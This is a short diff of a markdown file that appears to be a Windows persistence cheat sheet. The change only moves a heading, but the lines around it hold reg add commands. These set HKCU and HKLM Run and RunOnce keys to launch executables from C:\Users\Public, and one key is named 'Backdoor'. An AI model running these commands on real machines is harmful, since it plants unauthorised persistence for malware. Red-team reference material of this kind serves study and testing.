@@ -15,9 +15,9 @@ REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\User
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe
 
 ```
-
+## Elevated AutoRun Persistence:
 ```
-#Elevated AutoRun Persistence:
+
 
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
